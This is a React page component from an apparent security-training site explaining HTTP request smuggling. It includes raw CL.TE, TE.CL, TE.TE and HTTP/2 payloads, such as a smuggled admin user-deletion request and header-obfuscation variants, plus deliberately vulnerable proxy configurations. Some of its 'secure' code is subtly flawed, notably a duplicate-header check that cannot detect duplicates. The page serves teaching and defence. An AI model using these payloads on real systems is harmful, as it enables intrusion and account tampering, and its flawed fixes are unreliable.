
import React from 'react';
import { Bug, InfoIcon, Shield } from 'lucide-react';
import CodeExample from '@/components/CodeExample';
import SecurityCard from '@/components/SecurityCard';
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs';
import { Alert, AlertDescription, AlertTitle } from '@/components/ui/alert';

const HTTPRequestSmuggling: React.FC = () => {
  return (
    <section id="http-smuggling" className="scroll-mt-20">
      <h3 className="text-2xl font-bold mb-6 border-b-2 border-cybr-primary inline-block pb-2">HTTP Request Smuggling</h3>
      
      <div className="space-y-6">
        {/* Introduction */}
        <div>
          <p className="mb-4">
            HTTP Request Smuggling exploits discrepancies in how front-end and back-end servers process HTTP requests,
            particularly around message boundaries and header interpretation. When these servers disagree on where one 
            request ends and the next begins, attackers can "smuggle" requests to the back-end server, potentially 
            bypassing security controls, gaining unauthorized access to sensitive data, poisoning web caches, 
            performing session hijacking, or achieving complete authentication bypass in multi-server architectures.
          </p>
          
          <Alert className="mb-4 text-amber-900 dark:text-amber-200 bg-slate-50">
            <InfoIcon className="h-4 w-4" />
            <AlertTitle>Attacker's Goal</AlertTitle>
            <AlertDescription>
              Exploit HTTP parsing inconsistencies between front-end and back-end servers to bypass security controls,
              access unauthorized functionality, poison caches, hijack user sessions, or gain access to other users' 
              requests and responses in multi-tier web architectures.
            </AlertDescription>
          </Alert>
        </div>

        {/* Attack Types */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Types of HTTP Request Smuggling</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
            <SecurityCard
              title="CL.TE (Content-Length.Transfer-Encoding)"
              description="Front-end uses Content-Length header while back-end prioritizes Transfer-Encoding: chunked, causing request boundary confusion."
              severity="high"
            />
            <SecurityCard
              title="TE.CL (Transfer-Encoding.Content-Length)"
              description="Front-end processes Transfer-Encoding while back-end uses Content-Length, leading to request smuggling opportunities."
              severity="high"
            />
            <SecurityCard
              title="TE.TE (Transfer-Encoding.Transfer-Encoding)"
              description="Both servers support Transfer-Encoding but handle it differently, often through header obfuscation or malformed values."
              severity="medium"
            />
            <SecurityCard
              title="HTTP/2 Request Smuggling"
              description="Exploiting differences between HTTP/2 and HTTP/1.1 processing when requests are downgraded between protocol versions."
              severity="high"
            />
            <SecurityCard
              title="Cache Poisoning via Smuggling"
              description="Using request smuggling to inject malicious responses into web caches, affecting subsequent legitimate users."
              severity="high"
            />
            <SecurityCard
              title="Session Hijacking Smuggling"
              description="Smuggling requests to capture other users' session tokens, cookies, or authentication headers."
              severity="high"
            />
          </div>
        </div>

        {/* Vulnerable Components */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Commonly Vulnerable Components</h4>
          <div className="p-4 bg-cybr-muted/50 rounded-md">
            <ul className="list-disc pl-6 space-y-2">
              <li><strong>Load Balancers:</strong> HAProxy, F5, AWS ALB/ELB, Azure Load Balancer with backend application servers</li>
              <li><strong>Reverse Proxies:</strong> Nginx, Apache HTTP Server, Cloudflare, CDN services fronting application servers</li>
              <li><strong>Web Application Firewalls:</strong> WAF devices that inspect and forward requests to backend applications</li>
              <li><strong>API Gateways:</strong> Kong, Ambassador, AWS API Gateway processing requests before backend services</li>
              <li><strong>Content Delivery Networks:</strong> CDN edge servers that cache and forward requests to origin servers</li>
              <li><strong>Microservice Architectures:</strong> Service meshes and ingress controllers routing between services</li>
              <li><strong>Container Orchestration:</strong> Kubernetes ingress controllers and service proxies</li>
              <li><strong>Legacy Systems:</strong> Older HTTP implementations with inconsistent parsing behavior</li>
            </ul>
          </div>
        </div>

        {/* Why These Attacks Work */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Why HTTP Request Smuggling Works</h4>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">HTTP Specification Ambiguities</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>RFC 7230 allows both Content-Length and Transfer-Encoding headers</li>
                <li>Different interpretations of which header takes precedence</li>
                <li>Handling of malformed or duplicate headers varies between implementations</li>
                <li>HTTP/1.1 keep-alive connections reuse TCP connections for multiple requests</li>
                <li>Header folding and whitespace handling inconsistencies</li>
                <li>Case sensitivity differences in header names and values</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Implementation Differences</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Different HTTP libraries and servers parse headers with varying strictness</li>
                <li>Security devices often prioritize performance over strict RFC compliance</li>
                <li>Legacy systems may implement outdated HTTP parsing behavior</li>
                <li>Custom modifications to HTTP stacks introduce parsing inconsistencies</li>
                <li>Buffer handling and memory allocation differences affect parsing</li>
                <li>Error handling varies when processing malformed requests</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Step-by-Step Attack Methodology */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Step-by-Step Attack Methodology</h4>
          <Tabs defaultValue="discovery">
            <TabsList className="bg-slate-200 dark:bg-slate-800">
              <TabsTrigger value="discovery">Discovery</TabsTrigger>
              <TabsTrigger value="fingerprinting">Fingerprinting</TabsTrigger>
              <TabsTrigger value="exploitation">Exploitation</TabsTrigger>
              <TabsTrigger value="weaponization">Weaponization</TabsTrigger>
            </TabsList>
            
            <TabsContent value="discovery" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 1: Multi-Server Architecture Detection</h5>
                <ol className="list-decimal pl-6 space-y-2">
                  <li><strong>Infrastructure Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Identify front-end servers from HTTP headers (Server, X-Powered-By)</li>
                      <li>Look for load balancer or proxy indicators in response headers</li>
                      <li>Analyze response time variations suggesting multiple servers</li>
                      <li>Check for CDN or WAF services using HTTP headers and IP ranges</li>
                    </ul>
                  </li>
                  <li><strong>HTTP Behavior Analysis:</strong>
                    <ul className="list-disc pl-6 mt-1 space-y-1 text-sm">
                      <li>Test HTTP/1.1 keep-alive connection handling</li>
                      <li>Observe differences in error handling between requests</li>
                      <li>Check for HTTP/2 support and downgrade behavior</li>
                      <li>Analyze request routing and session affinity</li>
                    </ul>
                  </li>
                </ol>
              </div>
            </TabsContent>
            
            <TabsContent value="fingerprinting" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 2: Server Behavior Fingerprinting</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Fingerprinting Techniques:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Header Priority Testing:</strong> Send conflicting Content-Length and Transfer-Encoding headers</li>
                    <li><strong>Chunked Encoding Variations:</strong> Test different chunked encoding formats and edge cases</li>
                    <li><strong>Header Folding:</strong> Test line folding and whitespace handling in headers</li>
                    <li><strong>Malformed Request Testing:</strong> Send invalid HTTP requests to observe error handling</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="exploitation" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 3: Request Smuggling Exploitation</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Exploitation Steps:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Boundary Confusion Creation:</strong> Craft requests that are parsed differently by each server</li>
                    <li><strong>Request Smuggling Confirmation:</strong> Verify successful smuggling through timing or response analysis</li>
                    <li><strong>Backend Request Capture:</strong> Position smuggled requests to capture subsequent user requests</li>
                    <li><strong>Response Manipulation:</strong> Modify responses to inject malicious content</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
            
            <TabsContent value="weaponization" className="mt-4">
              <div className="space-y-4">
                <h5 className="font-semibold text-lg">Phase 4: Advanced Attack Weaponization</h5>
                <div className="p-4 bg-cybr-muted/50 rounded-md">
                  <h6 className="font-medium mb-2">Advanced Exploitation:</h6>
                  <ol className="list-decimal pl-6 space-y-2 text-sm">
                    <li><strong>Cache Poisoning:</strong> Inject malicious responses into caches affecting multiple users</li>
                    <li><strong>Authentication Bypass:</strong> Smuggle requests to access admin functionality</li>
                    <li><strong>Session Hijacking:</strong> Capture session tokens and authentication cookies</li>
                    <li><strong>Cross-User Attacks:</strong> Access other users' private data and functionality</li>
                  </ol>
                </div>
              </div>
            </TabsContent>
          </Tabs>
        </div>

        {/* Attack Payloads and Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">HTTP Request Smuggling Payloads</h4>
          
          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="CL.TE (Content-Length.Transfer-Encoding) Attack" 
            code={`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED POST /admin HTTP/1.1
Host: vulnerable-website.com
Content-Length: 15

x=1

# Explanation:
# Front-end server uses Content-Length: 13, reading exactly 13 bytes ("0\r\n\r\nSMUGGLED")
# Back-end server uses Transfer-Encoding: chunked, processing:
#   - Chunk size "0" (end of chunked message)
#   - Remaining data treated as start of new request: "SMUGGLED POST /admin..."

# This causes the smuggled request to be processed by the backend
# The next legitimate user request gets appended to the smuggled request`} 
          />

          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="TE.CL (Transfer-Encoding.Content-Length) Attack" 
            code={`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Explanation:
# Front-end uses Transfer-Encoding: chunked, processing:
#   - Chunk of size 8 containing "SMUGGLED"
#   - Zero-sized chunk indicating end
# Back-end uses Content-Length: 3, reading only "8\r\n"
# Remaining data "SMUGGLED\r\n0\r\n\r\n" becomes start of new request

# Advanced TE.CL payload with request smuggling
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked

5c
SMUGGLED POST /admin/delete-user HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30

user_id=victim&confirm=true
0


# This smuggles a complete admin request to delete a user account`} 
          />

          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="TE.TE (Transfer-Encoding Obfuscation) Attack" 
            code={`POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-Encoding: x

5c
SMUGGLED POST /admin HTTP/1.1
Host: vulnerable-website.com

0

# Obfuscated Transfer-Encoding headers
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

# Alternative obfuscation techniques:
Transfer-Encoding: chunked
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding: 
Transfer-Encoding: x

Transfer-Encoding: chunked
Transfer-Encoding\t: x

Transfer-Encoding\x0b: chunked

Transfer-Encoding\x0c: chunked

Transfer-Encoding\x00: chunked

[space]Transfer-Encoding: chunked

Transfer-Encoding: chunk

Transfer-Encoding: chunked; boundary=something`} 
          />

          <CodeExample 
            language="http" 
            isVulnerable={true}
            title="HTTP/2 Request Smuggling Attack" 
            code={`# HTTP/2 request that gets downgraded to HTTP/1.1
:method: POST
:path: /
:authority: vulnerable-website.com
content-length: 0

POST /admin/delete-user HTTP/1.1
Host: vulnerable-website.com
Content-Length: 37

user_id=victim&confirm=true

# When downgraded to HTTP/1.1, becomes:
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 0

POST /admin/delete-user HTTP/1.1
Host: vulnerable-website.com
Content-Length: 37

user_id=victim&confirm=true

# The backend processes two requests instead of one`} 
          />
        </div>

        {/* Vulnerable Configuration Examples */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Vulnerable Configuration Examples</h4>
          
          <CodeExample 
            language="nginx" 
            isVulnerable={true}
            title="Vulnerable Nginx Configuration" 
            code={`# VULNERABLE: Nginx configuration prone to request smuggling
upstream backend {
    server backend1.example.com:8080;
    server backend2.example.com:8080;
}

server {
    listen 80;
    server_name vulnerable-website.com;
    
    # VULNERABLE: Default proxy settings without strict parsing
    location / {
        proxy_pass http://backend;
        
        # Missing strict HTTP parsing directives
        proxy_http_version 1.1;
        proxy_set_header Connection "";
        
        # VULNERABLE: Allows conflicting headers to pass through
        proxy_pass_request_headers on;
        
        # No header validation or normalization
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }
}

# This configuration allows conflicting Content-Length and Transfer-Encoding
# headers to reach the backend, enabling request smuggling attacks`} 
          />

          <CodeExample 
            language="apache" 
            isVulnerable={true}
            title="Vulnerable Apache Configuration" 
            code={`# VULNERABLE: Apache configuration with request smuggling risk
<VirtualHost *:80>
    ServerName vulnerable-website.com
    
    # VULNERABLE: Default proxy configuration
    ProxyPreserveHost On
    ProxyPass / http://backend.example.com:8080/
    ProxyPassReverse / http://backend.example.com:8080/
    
    # Missing header validation
    # Allows malformed or conflicting headers
    
    # VULNERABLE: No strict HTTP parsing
    ProxyRequests Off
    
    # Default settings allow header smuggling
    ProxyPassReverse / http://backend.example.com:8080/
    
    # Missing security headers that could prevent smuggling
    # No RequestHeader directives to sanitize input
</VirtualHost>

# LoadModule configuration that may be vulnerable
LoadModule proxy_module modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

# Missing modules that could help prevent smuggling:
# LoadModule security2_module modules/mod_security2.so
# LoadModule evasive24_module modules/mod_evasive24.so`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={true}
            title="Vulnerable Node.js Proxy Implementation" 
            code={`const express = require('express');
const httpProxy = require('http-proxy-middleware');

const app = express();

// VULNERABLE: Default proxy configuration without header validation
const proxyOptions = {
    target: 'http://backend-server:8080',
    changeOrigin: true,
    // VULNERABLE: No header filtering or validation
    onProxyReq: (proxyReq, req, res) => {
        // Passes through all headers without validation
        // Including potentially malicious Transfer-Encoding variants
    },
    onProxyRes: (proxyRes, req, res) => {
        // No response validation
    }
};

// VULNERABLE: No request body parsing restrictions
app.use(express.raw({ type: '*/*', limit: '50mb' }));

// VULNERABLE: Direct proxy without smuggling protection
app.use('/', httpProxy(proxyOptions));

// Alternative vulnerable implementation using node-http-proxy
const httpProxy = require('http-proxy');
const proxy = httpProxy.createProxyServer({});

app.use((req, res) => {
    // VULNERABLE: No header validation before proxying
    proxy.web(req, res, {
        target: 'http://backend-server:8080'
    }, (error) => {
        console.error('Proxy error:', error);
        res.status(500).send('Proxy Error');
    });
});

// Missing security measures:
// 1. No Content-Length validation
// 2. No Transfer-Encoding header filtering
// 3. No request size limits
// 4. No header normalization
// 5. No duplicate header detection

app.listen(3000, () => {
    console.log('Vulnerable proxy server running on port 3000');
});`} 
          />
        </div>

        {/* Secure Implementation */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Secure Implementation Examples</h4>
          
          <CodeExample 
            language="nginx" 
            isVulnerable={false}
            title="Secure Nginx Configuration" 
            code={`# SECURE: Nginx configuration with request smuggling protection
upstream backend {
    server backend1.example.com:8080;
    server backend2.example.com:8080;
    
    # Health check configuration
    keepalive 32;
}

server {
    listen 443 ssl http2;
    server_name secure-website.com;
    
    # SECURE: SSL/TLS configuration
    ssl_certificate /path/to/certificate.crt;
    ssl_certificate_key /path/to/private.key;
    ssl_protocols TLSv1.2 TLSv1.3;
    
    # SECURE: Request size limits
    client_max_body_size 10m;
    client_body_buffer_size 128k;
    client_header_buffer_size 1k;
    large_client_header_buffers 4 4k;
    
    # SECURE: Timeout configurations
    client_body_timeout 12;
    client_header_timeout 12;
    proxy_connect_timeout 5;
    proxy_send_timeout 10;
    proxy_read_timeout 10;
    
    location / {
        # SECURE: Strict proxy configuration
        proxy_pass http://backend;
        proxy_http_version 1.1;
        
        # SECURE: Explicit connection handling
        proxy_set_header Connection "";
        
        # SECURE: Header normalization and validation
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        
        # SECURE: Remove potentially dangerous headers
        proxy_set_header Transfer-Encoding "";
        proxy_set_header Content-Length $content_length;
        
        # SECURE: Buffer configuration to prevent smuggling
        proxy_buffering on;
        proxy_buffer_size 4k;
        proxy_buffers 8 4k;
        proxy_busy_buffers_size 8k;
        
        # SECURE: Disable request buffering for large requests
        proxy_request_buffering off;
        
        # SECURE: Error handling
        proxy_intercept_errors on;
        error_page 400 404 500 502 503 504 /error.html;
    }
    
    # SECURE: Additional security headers
    add_header X-Frame-Options "SAMEORIGIN" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    
    # SECURE: Rate limiting to prevent abuse
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/m;
    
    location /api/ {
        limit_req zone=api burst=20 nodelay;
        proxy_pass http://backend;
        
        # Additional API-specific security measures
        proxy_set_header Transfer-Encoding "";
    }
}

# SECURE: HTTP to HTTPS redirect
server {
    listen 80;
    server_name secure-website.com;
    return 301 https://$server_name$request_uri;
}`} 
          />

          <CodeExample 
            language="javascript" 
            isVulnerable={false}
            title="Secure Node.js Proxy Implementation" 
            code={`const express = require('express');
const httpProxy = require('http-proxy-middleware');
const rateLimit = require('express-rate-limit');

const app = express();

// SECURE: Request size and rate limiting
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 100, // limit each IP to 100 requests per windowMs
    message: 'Too many requests from this IP'
});

app.use(limiter);

// SECURE: Body parsing with strict limits
app.use(express.json({ limit: '1mb', strict: true }));
app.use(express.urlencoded({ limit: '1mb', extended: false }));

// SECURE: Header validation and normalization middleware
const validateHeaders = (req, res, next) => {
    // Remove dangerous headers that could enable smuggling
    delete req.headers['transfer-encoding'];
    delete req.headers['content-encoding'];
    
    // Validate Content-Length if present
    if (req.headers['content-length']) {
        const contentLength = parseInt(req.headers['content-length'], 10);
        if (isNaN(contentLength) || contentLength < 0) {
            return res.status(400).json({ error: 'Invalid Content-Length header' });
        }
    }
    
    // Reject requests with duplicate headers
    const headerNames = Object.keys(req.headers);
    const duplicates = headerNames.filter((name, index) => 
        headerNames.indexOf(name) !== index
    );
    
    if (duplicates.length > 0) {
        return res.status(400).json({ error: 'Duplicate headers detected' });
    }
    
    // Normalize headers
    req.headers = normalizeHeaders(req.headers);
    
    next();
};

function normalizeHeaders(headers) {
    const normalized = {};
    
    for (const [name, value] of Object.entries(headers)) {
        // Convert to lowercase and trim whitespace
        const normalizedName = name.toLowerCase().trim();
        const normalizedValue = typeof value === 'string' ? value.trim() : value;
        
        // Skip potentially dangerous headers
        if (['transfer-encoding', 'content-encoding'].includes(normalizedName)) {
            continue;
        }
        
        normalized[normalizedName] = normalizedValue;
    }
    
    return normalized;
}

// SECURE: Proxy configuration with smuggling protection
const secureProxyOptions = {
    target: 'http://backend-server:8080',
    changeOrigin: true,
    secure: true,
    
    // SECURE: Header manipulation
    onProxyReq: (proxyReq, req, res) => {
        // Ensure clean headers
        proxyReq.removeHeader('transfer-encoding');
        proxyReq.removeHeader('content-encoding');
        
        // Set explicit Content-Length if body exists
        if (req.body && Object.keys(req.body).length > 0) {
            const bodyData = JSON.stringify(req.body);
            proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
            proxyReq.write(bodyData);
        }
        
        // Add security headers
        proxyReq.setHeader('X-Forwarded-For', req.ip);
        proxyReq.setHeader('X-Forwarded-Proto', req.protocol);
        proxyReq.setHeader('X-Request-ID', generateRequestId());
    },
    
    // SECURE: Response validation
    onProxyRes: (proxyRes, req, res) => {
        // Validate response headers
        if (proxyRes.headers['transfer-encoding'] && proxyRes.headers['content-length']) {
            // Remove conflicting headers
            delete proxyRes.headers['transfer-encoding'];
        }
        
        // Add security headers to response
        proxyRes.headers['X-Frame-Options'] = 'SAMEORIGIN';
        proxyRes.headers['X-Content-Type-Options'] = 'nosniff';
    },
    
    // SECURE: Error handling
    onError: (err, req, res) => {
        console.error('Proxy error:', err);
        res.status(502).json({ error: 'Bad Gateway' });
    },
    
    // SECURE: Timeout configuration
    timeout: 30000,
    proxyTimeout: 30000,
    
    // SECURE: Disable automatic following of redirects
    followRedirects: false
};

function generateRequestId() {
    return Math.random().toString(36).substr(2, 9);
}

// SECURE: Apply header validation to all routes
app.use(validateHeaders);

// SECURE: Proxy middleware with protection
app.use('/', httpProxy(secureProxyOptions));

// SECURE: Error handling middleware
app.use((error, req, res, next) => {
    console.error('Application error:', error);
    res.status(500).json({ error: 'Internal Server Error' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(\`Secure proxy server running on port \${PORT}\`);
});

// SECURE: Additional process-level security
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
    process.exit(1);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection at:', promise, 'reason:', reason);
    process.exit(1);
});`} 
          />
        </div>

        {/* Testing and Detection */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Testing for HTTP Request Smuggling</h4>
          
          <div className="space-y-4">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Manual Testing Methodology</h5>
              <ol className="list-decimal pl-6 space-y-2 text-sm">
                <li><strong>Baseline Connection Testing:</strong> Establish normal HTTP behavior and connection handling</li>
                <li><strong>Header Conflict Testing:</strong> Send requests with conflicting Content-Length and Transfer-Encoding headers</li>
                <li><strong>Timing Analysis:</strong> Measure response times to detect request boundary confusion</li>
                <li><strong>Response Queue Testing:</strong> Send sequences of requests to detect out-of-order responses</li>
                <li><strong>Backend Request Capture:</strong> Attempt to capture subsequent user requests</li>
                <li><strong>Cache Poisoning Testing:</strong> Try to inject malicious responses into caches</li>
              </ol>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Specialized Testing Tools</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li><strong>Burp Suite Professional:</strong> Built-in HTTP Request Smuggling scanner and manual testing tools</li>
                <li><strong>HTTP Request Smuggler:</strong> Specialized Burp extension for advanced smuggling detection</li>
                <li><strong>Smuggler.py:</strong> Python tool for automated request smuggling detection</li>
                <li><strong>h2cSmuggler:</strong> Tool specifically for HTTP/2 request smuggling</li>
                <li><strong>Commix:</strong> Command injection tool that can detect some smuggling vulnerabilities</li>
                <li><strong>Custom Scripts:</strong> Purpose-built tools for specific application architectures</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Prevention Strategies */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Comprehensive Prevention Strategies</h4>
          
          <Alert className="mb-6">
            <Shield className="h-4 w-4" />
            <AlertTitle>Defense in Depth</AlertTitle>
            <AlertDescription>
              Implement multiple layers of protection including strict HTTP parsing, header validation, 
              and network-level controls to prevent request smuggling attacks across your infrastructure.
            </AlertDescription>
          </Alert>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div className="p-4 rounded-md border border-green-200 dark:border-green-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-green-800 dark:text-green-200">Server Configuration</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>Consistent HTTP Parsing:</strong> Ensure all servers parse HTTP requests identically</li>
                <li><strong>Header Validation:</strong> Reject requests with conflicting or malformed headers</li>
                <li><strong>Strict RFC Compliance:</strong> Configure servers to strictly follow HTTP specifications</li>
                <li><strong>HTTP/2 End-to-End:</strong> Use HTTP/2 throughout the infrastructure when possible</li>
                <li><strong>Connection Management:</strong> Properly handle connection reuse and termination</li>
                <li><strong>Request Size Limits:</strong> Implement appropriate limits for request sizes and timeouts</li>
              </ul>
            </div>
            
            <div className="p-4 rounded-md border border-blue-200 dark:border-blue-800 bg-cybr-muted">
              <h5 className="font-semibold mb-3 text-blue-800 dark:text-blue-200">Infrastructure Security</h5>
              <ul className="list-disc pl-6 space-y-2 text-sm">
                <li><strong>WAF Deployment:</strong> Use web application firewalls with smuggling detection</li>
                <li><strong>Regular Updates:</strong> Keep all HTTP infrastructure components updated</li>
                <li><strong>Security Testing:</strong> Include request smuggling in regular penetration testing</li>
                <li><strong>Monitoring and Alerting:</strong> Implement detection for suspicious request patterns</li>
                <li><strong>Network Segmentation:</strong> Isolate front-end and back-end server communications</li>
                <li><strong>Configuration Management:</strong> Maintain consistent configurations across environments</li>
              </ul>
            </div>
          </div>
        </div>

        {/* Environment-Specific Considerations */}
        <div>
          <h4 className="text-xl font-semibold mb-4">Environment-Specific Considerations</h4>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Cloud Environments</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Configure cloud load balancers securely</li>
                <li>Understand cloud proxy behavior and limitations</li>
                <li>Use cloud-native WAF services</li>
                <li>Monitor cloud-specific attack patterns</li>
                <li>Implement cloud security groups properly</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Microservices</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Secure service mesh configurations</li>
                <li>Validate requests at service boundaries</li>
                <li>Implement proper ingress controller security</li>
                <li>Monitor inter-service communications</li>
                <li>Use mutual TLS between services</li>
              </ul>
            </div>
            
            <div className="p-4 bg-cybr-muted/50 rounded-md">
              <h5 className="font-semibold mb-2">Legacy Systems</h5>
              <ul className="list-disc pl-6 space-y-1 text-sm">
                <li>Upgrade HTTP implementations where possible</li>
                <li>Add protective proxies in front of legacy systems</li>
                <li>Implement additional validation layers</li>
                <li>Monitor legacy system behavior closely</li>
                <li>Plan for gradual modernization</li>
              </ul>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default HTTPRequestSmuggling;
